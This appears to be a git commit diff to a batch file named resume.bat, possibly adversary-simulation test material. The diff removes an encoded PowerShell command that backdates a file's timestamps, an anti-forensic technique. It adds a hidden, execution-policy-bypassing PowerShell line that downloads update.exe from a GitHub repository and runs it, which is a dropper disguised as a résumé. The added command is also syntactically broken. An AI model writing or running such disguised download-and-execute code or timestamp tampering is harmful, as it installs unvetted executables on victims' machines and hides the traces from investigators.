ec4ec8366069760f8b82ef461e29c9ccac7368f8
markersmake <bmag262@gmail.com>
2021-01-17 19:26:35 -0500

    Update resume.bat
    Updated to download update.exe

--- resume.bat
+++ resume.bat
@@ -1,5 +1,5 @@
 echo "Atomic Test File" > test.txt
 
-PowerShell.exe -enc JABmAGkAbABlAD0AKABnAGkAIAB0AGUAcwB0AC4AdAB4AHQAKQA7ACQAZABhAHQAZQA9ACcANwAvADEANgAvADEAOQA0ADUAIAA1ADoAMgA5AGEAbQAnADsAJABmAGkAbABlAC4ATABhAHMAdABXAHIAaQB0AGUAVABpAG0AZQA9ACQAZABhAHQAZQA7ACQAZgBpAGwAZQAuAEwAYQBzAHQAQQBjAGMAZQBzAHMAVABpAG0AZQA9ACQAZABhAHQAZQA7ACQAZgBpAGwAZQAuAEMAcgBlAGEAdABpAG8AbgBUAGkAbQBlAD0AJABkAGEAdABlAA==
+powershell.exe -command PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('https://github.com/markersmake/RandomScripts/raw/master/update.exe'); Start-Process(update.exe)"
 
 del test.txt
